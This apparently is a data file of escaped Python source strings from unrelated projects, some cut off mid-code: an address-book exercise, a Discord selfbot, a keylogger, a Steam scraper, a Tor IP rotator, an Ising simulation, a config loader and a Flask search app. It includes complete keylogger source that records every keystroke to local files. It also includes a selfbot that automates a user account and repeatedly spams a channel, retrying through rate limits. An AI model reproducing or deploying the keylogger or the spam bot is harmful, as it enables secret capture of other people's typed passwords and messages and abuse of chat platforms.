\u0440\u0435\u0434\u0430\u0433\u0443\u0432\u0430\u043d\u043d\u044f \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0443 \u0434\u043b\u044f John\r\n    john = book.find(\"John\")\r\n    john.edit_phone(\"1234567890\", \"1112223333\")\r\n\r\n    print(john)  # \u0412\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f: Contact name: John, phones: 1112223333; 5555555555\r\n\r\n    # \u041f\u043e\u0448\u0443\u043a \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u043e\u0433\u043e \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0443 \u0443 \u0437\u0430\u043f\u0438\u0441\u0456 John\r\n    found_phone = john.find_phone(\"5555555555\")\r\n    print(f\"{john.name}: {found_phone}\")  # \u0412\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f: 5555555555\r\n\r\n    # \u0412\u0438\u0434\u0430\u043b\u0435\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 Jane\r\n    book.delete(\"Jane\")\r\n\r\n",
    "import discord\r\nimport asyncio\r\nfrom discord.ext import commands\r\nfrom discord.ext.commands import clean_content\r\nimport json\r\nimport os\r\nimport aiohttp\r\nimport io\r\nimport winsound\r\nimport subprocess\r\nfrom datetime import datetime\r\nfrom colorama import Fore, Style, init\r\nimport time\r\nimport sys\r\n\r\n\r\ninit()\r\nos.system(f\"title Bliss Selfbot cargando...\")\r\ndef setear_tamano_ventana(alto, ancho):\r\n    os.system(f\"mode con: cols={ancho} lines={alto}\")\r\n\r\nsetear_tamano_ventana(30, 88)\r\n\r\ndef menu():\r\n    print(Fore.CYAN + \"\"\"\r\n                 \u2584\u2584\u2584\u2584    \u2588\u2588\u2593     \u2588\u2588\u2593  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 \r\n                \u2593\u2588\u2588\u2588\u2588\u2588\u2584 \u2593\u2588\u2588\u2592    \u2593\u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2592\u2588\u2588    \u2592 \r\n                \u2592\u2588\u2588\u2592 \u2584\u2588\u2588\u2592\u2588\u2588\u2591    \u2592\u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2584   \u2591 \u2593\u2588\u2588\u2584   \r\n                \u2592\u2588\u2588\u2591\u2588\u2580  \u2592\u2588\u2588\u2591    \u2591\u2588\u2588\u2591  \u2592   \u2588\u2588\u2592  \u2592   \u2588\u2588\u2592\r\n                \u2591\u2593\u2588  \u2580\u2588\u2593\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2591\u2588\u2588\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\r\n                \u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\u2591 \u2592\u2591\u2593  \u2591\u2591\u2593  \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\r\n                \u2592\u2591\u2592   \u2591 \u2591 \u2591 \u2592  \u2591 \u2592 \u2591\u2591 \u2591\u2592  \u2591 \u2591\u2591 \u2591\u2592  \u2591 \u2591\r\n                 \u2591    \u2591   \u2591 \u2591    \u2592 \u2591\u2591  \u2591  \u2591  \u2591  \u2591  \u2591  \r\n                 \u2591          \u2591  \u2591 \u2591        \u2591        \u2591  \r\n                      \u2591                               \r\n                            Bliss Selfbot 1.0\r\n###############################################################\"\"\" + Style.RESET_ALL)\r\n\r\nbot = commands.Bot(command_prefix=\".\", help_command=None, case_insensitive=True, self_bot=True)\r\nstart_time = datetime.now()\r\n\r\nwhitelist = [1075975022230900797]\r\n\r\nwith open('config.json', 'r') as file:\r\n    config = json.load(file)\r\n    token = config['token']\r\n\r\nasync def send_messages(ctx, message):\r\n    while True:\r\n        if not getattr(bot, 'send_messages', True):\r\n            break\r\n        sent_message = await ctx.channel.send(message)\r\n        await asyncio.sleep(1)\r\nmenu()\r\n@bot.event\r\nasync def on_ready():\r\n    print(f\"    [EXITOSO] Connected as {bot.user.name}({bot.user.id})\")\r\n    activity = discord.Activity(\r\n        type=discord.ActivityType.playing,\r\n        name=\"/PDAT\"\r\n    )\r\n    os.system(f\"title Bliss Selfbot Logged as: {bot.user.name}\")\r\n    await bot.change_presence(activity=activity, status=discord.Status.online, afk=False)\r\n    pc_name = 'Bliss'  # Reemplaza esto con el nombre de tu PC\r\n\r\n    with open('config.json', 'r') as config_file:\r\n        config = json.load(config_file)\r\n\r\n    os.system(f\"title Bliss Selfbot logged as {bot.user.name}\")\r\n    winsound.PlaySound(\"C:/Users/bliss/Desktop/bliss selfbot/data/beep.wav\", winsound.SND_FILENAME)\r\n\r\n@bot.command(pass_context=True)\r\nasync def ping(ctx):\r\n    if ctx.author.id in whitelist:\r\n        message = await ctx.reply('Pong!')\r\n        await message.delete()\r\n\r\nspam_active = False  # Variable de estado para controlar si el spam est\u00e1 activo\r\n\r\n@bot.command(pass_context=True)\r\nasync def spam(ctx, *, message: commands.clean_content):\r\n    global spam_active\r\n    if ctx.author.id in whitelist:\r\n        spam_active = True  # Activar el spam\r\n        await ctx.send(message)  # Env\u00eda el mensaje inicial\r\n        await asyncio.sleep(2)  # Espera 2 segundos\r\n\r\n        while spam_active:\r\n            try:\r\n                await ctx.send(message)  # Env\u00eda el mensaje repetido\r\n                await asyncio.sleep(2)  # Espera 2 segundos entre cada repetici\u00f3n\r\n            except discord.HTTPException as e:\r\n                if e.status == 429:\r\n                    await asyncio.sleep(3)  # Espera 3 segundos y vuelve a intentar\r\n                    continue\r\n                else:\r\n                    raise\r\n\r\n        await ctx.message.delete()  # Elimina el mensaje de comando\r\n\r\n@bot.command(pass_context=True)\r\nasync def spamstop(ctx):\r\n    global spam_active\r\n    if ctx.author.id in whitelist:\r\n        spam_active = False  # Detener el spam\r\n    await ctx.message.delete()\r\n\r\n@bot.command()\r\nasync def config(ctx):\r\n    if ctx.author.id in whitelist:\r\n        try:\r\n            subprocess.Popen(['start', 'config.json'], shell=True)\r\n            print(\"    [EXITOSO] Archivo config.json abierto exitosamente\")\r\n        except Exception as e:\r\n            print(\"    [ERROR] No se pudo abrir config.json\")\r\n            print(f\"Detalles del error: {e}\")\r\n        winsound.PlaySound(\"C:/Users/bliss/Desktop/bliss selfbot/data/beep.wav\", winsound.SND_FILENAME)\r\n        await ctx.message.delete()\r\n\r\n@bot.command()\r\nasync def actividad(ctx, tipo, *, texto):\r\n    if ctx.author.id in whitelist:\r\n        try:\r\n            if tipo.lower() == \"playing\":\r\n                activity = discord.Game(name=texto)\r\n            elif tipo.lower() == \"streaming\":\r\n                activity = discord.Streaming(name=texto, url=texto)\r\n            elif tipo.lower() == \"watching\":\r\n                activity = discord.Activity(type=discord.ActivityType.watching, name=texto)\r\n            elif tipo.lower() == \"listening\":\r\n                activity = discord.Activity(type=discord.ActivityType.listening, name=texto)\r\n            else:\r\n                print(\"    [ERROR] Tipo de actividad no v\u00e1lido. Los tipos v\u00e1lidos son 'playing', 'streaming', 'watching' y 'listening'.\")\r\n                re",
    "\r\nimport tkinter as tk\r\nfrom tkinter import *\r\nfrom pynput import keyboard\r\nimport json\r\n\r\nkeys_used = []\r\nflag = False\r\nkeys = \"\"\r\n\r\ndef generate_text_log(key):\r\n    with open('key_log.txt', \"w+\") as keys:\r\n        keys.write(key)\r\n\r\ndef generate_json_file(keys_used):\r\n    with open('key_log.json', '+wb') as key_log:\r\n        key_list_bytes = json.dumps(keys_used).encode()\r\n        key_log.write(key_list_bytes)\r\n\r\ndef on_press(key):\r\n    global flag, keys_used, keys\r\n    if flag == False:\r\n        keys_used.append(\r\n            {'Pressed': f'{key}'}\r\n        )\r\n        flag = True\r\n\r\n    if flag == True:\r\n        keys_used.append(\r\n            {'Held': f'{key}'}\r\n        )\r\n    generate_json_file(keys_used)\r\n\r\n\r\ndef on_release(key):\r\n    global flag, keys_used, keys\r\n    keys_used.append(\r\n        {'Released': f'{key}'}\r\n    )\r\n\r\n    if flag == True:\r\n        flag = False\r\n    generate_json_file(keys_used)\r\n\r\n    keys = keys + str(key)\r\n    generate_text_log(str(keys))\r\n\r\ndef start_keylogger():\r\n    global listener\r\n    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\r\n    listener.start()\r\n    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.txt'\")\r\n    start_button.config(state='disabled')\r\n    stop_button.config(state='normal')\r\n\r\ndef stop_keylogger():\r\n    global listener\r\n    listener.stop()\r\n    label.config(text=\"Keylogger stopped.\")\r\n    start_button.config(state='normal')\r\n    stop_button.config(state='disabled')\r\n\r\nroot = Tk()\r\nroot.title(\"Keylogger\")\r\n\r\nlabel = Label(root, text='Click \"Start\" to begin keylogging.')\r\nlabel.config(anchor=CENTER)\r\nlabel.pack()\r\n\r\nstart_button = Button(root, text=\"Start\", command=start_keylogger)\r\nstart_button.pack(side=LEFT)\r\n\r\nstop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\r\nstop_button.pack(side=RIGHT)\r\n\r\nroot.geometry(\"250x250\")\r\n\r\nroot.mainloop()\r\n",
    "import requests\n\ndef isvacenabled(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Valve Anti-Cheat enabled\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n\ndef hasinapppurchases(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"In-App Purchases\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hasleveleditor(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Includes level editor\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n\ndef hassteamworkshop(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Steam Workshop\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hassourcesdk(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Includes Source SDK\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hasachievements(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Steam Achievements\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef usessteamcloud(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Steam Cloud\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef supportsfamilysharing(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Family Sharing\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hassingleplayer(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Single-player\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hasonlinecoop(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Online co-op\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hastradingcards(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}\"\n    steam_response = requests.get(steam_url)\n    if \"Steam Trading Cards\" in steam_response.text:\n        steam_app_response = \"Yes\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    else:\n        steam_app_response = \"No\"\n        steam_app_response = str(steam_app_response)\n        return steam_app_response\n    \ndef hassplitscreenpvp(app_id):\n    steam_url = f\"https://store.steampowered.com/app/{app_id}",
    "import requests\nimport os\nfrom time import sleep\nimport sys\nimport threading\n\nclass colors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKCYAN = '\\033[96m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n    PINK = '\\033[95m'\n    HACKER_GREEN = '\\033[92m'  \n\ndef clear_terminal():\n    os.system('cls' if os.name == 'nt' else 'clear')\n\ndef check_tor_service():\n    try:\n        print(colors.OKBLUE + \"\\nChecking Tor Service.\" + colors.ENDC)\n        response = os.system(\"service tor status > /dev/null 2>&1\")\n        if response != 0:\n            print(colors.FAIL + \"Tor Service Running X\" + colors.ENDC)\n            start_tor_service()\n        else:\n            print(colors.OKGREEN + \"Tor Service Running \u2714\" + colors.ENDC)\n    except Exception as e:\n        print(colors.FAIL + \"\\nFailed to check Tor service status:\", e + colors.ENDC)\n        sys.exit(1)\n\ndef start_tor_service():\n    try:\n        sys.stdout.write(\"\\r\" + colors.BOLD + colors.OKBLUE + \"Starting Tor Service\" + colors.ENDC)\n        for i in range(1, 101):\n            sys.stdout.write(\"\\r\" + colors.BOLD + colors.HACKER_GREEN + f\"Starting Tor Service: [{'#' * (i // 5)}{' ' * ((100 - i) // 5)}] {i}%\" + colors.ENDC)\n            sys.stdout.flush()\n            sleep(0.1)\n        os.system(\"sudo service tor start > /dev/null 2>&1\")\n        print(\"\\n\" + colors.OKGREEN + \"Tor service started successfully.\" + colors.ENDC)\n        clear_terminal()\n        Main()\n    except Exception as e:\n        print(colors.FAIL + \"\\nFailed to start Tor service:\", e + colors.ENDC)\n        sys.exit(1)\n\ndef spinner_effect():\n    spinner = ['|', '/', '-', '\\\\']\n    i = 0\n    while True:\n        sys.stdout.write(\"\\r\" + colors.BOLD + \"Changing IP... \" + colors.OKCYAN + spinner[i] + colors.ENDC)\n        sys.stdout.flush()\n        sleep(0.1)\n        i = (i + 1) % 4\n\ndef Main():\n    clear_terminal()\n    print(colors.PINK + \"\"\"\n\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \n\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \n\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \n\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591    \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \n\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591     \n\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591     \n\u2591\u2592\u2593\u2588\u2593\u2592\u2591       \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591     \n                                                                                                          \n                                                                                                          \nFollow on instagram: @pwnkitty <3\"\"\" + colors.ENDC)\n\n    check_tor_service()  \n    change = int(input(colors.WARNING + \"\\nEnter the interval (in seconds) for changing your IP: \" + colors.ENDC))\n\n    url = \"https://httpbin.org/ip\"\n    proxy = {'http':'socks5://127.0.0.1:9050', 'https':'socks5://127.0.0.1:9050'}\n\n    spinner_thread = threading.Thread(target=spinner_effect)\n    spinner_thread.start()\n\n    while True:\n        try:\n            response = requests.get(url, proxies=proxy, timeout=10)  \n            if response.status_code == 200:\n                sys.stdout.write(\"\\r\\033[K\")\n                print(colors.OKGREEN + \"Your Current IP Is:: {}\".format(response.json().get(\"origin\")) + colors.ENDC)\n        except Exception as e:\n            sys.stdout.write(\"\\r\\033[K\")\n            print(colors.FAIL + \"An error occurred while fetching IP:\", e + colors.ENDC)\n        sleep(change)\n\nif __name__ == \"__main__\":\n    Main()\n",
    "import numpy as np\r\nimport matplotlib.pyplot as plt\r\nimport time\r\nimport datetime\r\n\r\nkB = 1  # Boltzmann constant in reduced units\r\n\r\ndef simulate(steps, size, temperature, J=1., H=0):\r\n    spins = np.random.choice([-1, 1], size=(size, size)) #generates the spins on the latice\r\n    # initalized as floats to avoid overflow errors\r\n    sum_energy = 0.\r\n    sum_energy_squared = 0.\r\n    sum_magnetization = 0.\r\n    sum_magnetization_squared = 0.\r\n\r\n    for step in range(steps): # full steps loop\r\n        spins = montecarloMetStep(size, temperature, spins, J, H)\r\n        energy = hamiltonian(J, H, spins)\r\n        magnetization = np.sum(spins)\r\n\r\n        #data collection\r\n        sum_energy += energy\r\n        sum_energy_squared += energy ** 2\r\n        sum_magnetization += magnetization\r\n        sum_magnetization_squared += magnetization ** 2\r\n\r\n    # data averaging\r\n    avg_energy = sum_energy / steps\r\n    avg_magnetization = sum_magnetization / steps\r\n\r\n    heatcapacity = calculateHeatCapacity(steps, temperature, avg_energy, sum_energy_squared)\r\n    MagneticSus = calculateMagneticSus(steps, temperature, avg_magnetization, sum_magnetization_squared)\r\n    return avg_energy, avg_magnetization, heatcapacity, MagneticSus\r\n\r\ndef calculateHeatCapacity(steps, temperature, avg_energy, sum_energy_squared):\r\n    avg_energy_squared = sum_energy_squared / steps\r\n    heatcapacity = (avg_energy_squared - avg_energy ** 2) / (kB * temperature ** 2)\r\n    return heatcapacity\r\n\r\ndef calculateMagneticSus(steps, temperature, avg_magnetization, sum_magnetization_squared):\r\n    avg_magnetization_squared = sum_magnetization_squared / steps\r\n    MagneticSus = (avg_magnetization_squared - avg_magnetization ** 2) / (kB * temperature)\r\n    return MagneticSus\r\n\r\ndef montecarloMetStep(size, temperature, spins, J, H):\r\n    for step in range(size ** 2):\r\n        i, j = np.random.randint(0, size, 2)\r\n        dEng = dEnergy(spins, i, j, size, J, H)\r\n        if dEng < 0 or np.random.rand() < np.exp(-dEng / (kB * temperature)):\r\n                spins[i, j] *= -1\r\n    return spins\r\n\r\ndef dEnergy(spins, i, j, size, J, H):\r\n    up = spins[(i - 1) % size, j]\r\n    down = spins[(i + 1) % size, j]\r\n    left = spins[i, (j - 1) % size]\r\n    right = spins[i, (j + 1) % size]\r\n\r\n    dEng = 2 * spins[i, j] * (J * (up + down + left + right) + H)\r\n    return dEng\r\n\r\ndef hamiltonian(J, H, spins):\r\n    energy = (-J * (np.sum(spins * np.roll(spins, 1, axis=0)) + np.sum(spins * np.roll(spins, 1, axis=1)))) -(H * np.sum(spins))\r\n    return energy\r\n\r\ndef plotModel(size, steps, J=1, H=0):\r\n    start_time = time.time() # getting the start time\r\n    energies = []\r\n    magnetizations = []\r\n    heat_capacities = []\r\n    magnetic_susceptibilities = []\r\n    temperatures = []\r\n\r\n    tempRange = np.linspace(1.0, 4.0, 60)  # temp 1-4 creates 60 steps inbetween\r\n\r\n    for temp in tempRange:\r\n        energy, magnetization, heat_capacity, magnetic_sus = simulate(steps, size, temp, J, H)\r\n        energies.append(energy)\r\n        magnetizations.append(abs(magnetization))\r\n        heat_capacities.append(heat_capacity)\r\n        magnetic_susceptibilities.append(magnetic_sus)\r\n        temperatures.append(temp)\r\n\r\n    plt.figure(figsize=(12, 10))\r\n\r\n    # Plot energy\r\n    plt.subplot(2, 2, 1)\r\n    plt.plot(temperatures, energies, 'o-')\r\n    plt.title('Energy')\r\n    plt.xlabel('Temperature')\r\n    plt.ylabel('Energy')\r\n\r\n    # Plot magnetization\r\n    plt.subplot(2, 2, 2)\r\n    plt.plot(temperatures, magnetizations, 'o-')\r\n    plt.title('Magnetization')\r\n    plt.xlabel('Temperature')\r\n    plt.ylabel('Magnetization')\r\n\r\n    # Plot heat capacity\r\n    plt.subplot(2, 2, 3)\r\n    plt.plot(temperatures, heat_capacities, 'o-')\r\n    plt.title('Heat Capacity')\r\n    plt.xlabel('Temperature')\r\n    plt.ylabel('Heat Capacity')\r\n\r\n    # Plot magnetic susceptibility\r\n    plt.subplot(2, 2, 4)\r\n    plt.plot(temperatures, magnetic_susceptibilities, 'o-')\r\n    plt.title('Magnetic Susceptibility')\r\n    plt.xlabel('Temperature')\r\n    plt.ylabel('Magnetic Susceptibility')\r\n\r\n    end_time = time.time() # getting the end time\r\n    print(end_time - start_time) # displaying the program run time\r\n    # formating, saving and displaying the plotted data to the screen\r\n    plt.tight_layout()\r\n    plotname = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')\r\n    plt.savefig(fr'C:\\Users\\Tommy\\PycharmProjects\\IsingMonteCarlo\\output\\{plotname}.png')\r\n    plt.show()\r\n\r\nif __name__ == '__main__':\r\n    size = 10  # 10x10 lattice\r\n    temperature = 2.5  # Temperature\r\n    steps = 2000  # Monte Carlo steps\r\n\r\n    plotModel(size, steps)",
    "import os\nimport socket\nimport tomli\nfrom loguru import logger\n\nroot_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))\nconfig_file = f\"{root_dir}/config.toml\"\nif not os.path.isfile(config_file):\n    example_file = f\"{root_dir}/config.example.toml\"\n    if os.path.isfile(example_file):\n        import shutil\n        shutil.copyfile(example_file, config_file)\n        logger.info(f\"copy config.example.toml to config.toml\")\n\nlogger.info(f\"load config from file: {config_file}\")\n\nwith open(config_file, mode=\"rb\") as fp:\n    _cfg = tomli.load(fp)\n\napp = _cfg.get(\"app\", {})\nwhisper = _cfg.get(\"whisper\", {})\npexels = _cfg.get(\"pexels\", {})\n\nhostname = socket.gethostname()\n\nlog_level = _cfg.get(\"log_level\", \"DEBUG\")\nlisten_host = _cfg.get(\"listen_host\", \"0.0.0.0\")\nlisten_port = _cfg.get(\"listen_port\", 8080)\nproject_name = _cfg.get(\"project_name\", \"MoneyPrinterTurbo\")\nproject_description = _cfg.get(\"project_description\", \"MoneyPrinterTurbo\\n by \u6296\u97f3-\u7f51\u65ed\u54c8\u745e.AI\")\nproject_version = _cfg.get(\"project_version\", \"1.0.0\")\nreload_debug = False\n\nimagemagick_path = app.get(\"imagemagick_path\", \"\")\nif imagemagick_path and os.path.isfile(imagemagick_path):\n    os.environ[\"IMAGEMAGICK_BINARY\"] = imagemagick_path\n\nffmpeg_path = app.get(\"ffmpeg_path\", \"\")\nif ffmpeg_path and os.path.isfile(ffmpeg_path):\n    os.environ[\"IMAGEIO_FFMPEG_EXE\"] = ffmpeg_path\n\n# __cfg = {\n#     \"hostname\": hostname,\n#     \"listen_host\": listen_host,\n#     \"listen_port\": listen_port,\n# }\n# logger.info(__cfg)\n",
    "from elasticsearch import Elasticsearch, exceptions\nimport os\nimport time\nfrom flask import Flask, jsonify, request, render_template\nimport sys\nimport requests\n\nes = Elasticsearch(host='es')\n\napp = Flask(__name__)\n\ndef load_data_in_es():\n    \"\"\" creates an index in elasticsearch \"\"\"\n    url = \"http://data.sfgov.org/resource/rqzj-sfat.json\"\n    r = requests.get(url)\n    data = r.json()\n    print \"Loading data in elasticsearch ...\"\n    for id, truck in enumerate(data):\n        res = es.index(index=\"sfdata\", doc_type=\"truck\", id=id, body=truck)\n    print \"Total trucks loaded: \", len(data)\n\ndef safe_check_index(index, retry=3):\n    \"\"\" connect to ES with retry \"\"\"\n    if not retry:\n        print \"Out of retries. Bailing out...\"\n        sys.exit(1)\n    try:\n        status = es.indices.exists(index)\n        return status\n    except exceptions.ConnectionError as e:\n        print \"Unable to connect to ES. Retrying in 5 secs...\"\n        time.sleep(5)\n        safe_check_index(index, retry-1)\n\ndef format_fooditems(string):\n    items = [x.strip().lower() for x in string.split(\":\")]\n    return items[1:] if items[0].find(\"cold truck\") > -1 else items\n\ndef check_and_load_index():\n    \"\"\" checks if index exits and loads the data accordingly \"\"\"\n    if not safe_check_index('sfdata'):\n        print \"Index not found...\"\n        load_data_in_es()\n\n###########\n### APP ###\n###########\n\n# @app.route('/')\n# def index():\n#     return render_template('index.html')\n\n@app.route('/debug')\ndef test_es():\n    resp = {}\n    try:\n        msg = es.cat.indices()\n        resp[\"msg\"] = msg\n        resp[\"status\"] = \"success\"\n    except:\n        resp[\"status\"] = \"failure\"\n        resp[\"msg\"] = \"Unable to reach ES\"\n    return jsonify(resp)\n\n@app.route('/search')\ndef search():\n    key = request.args.get('q')\n    if not key:\n        return jsonify({\n            \"status\": 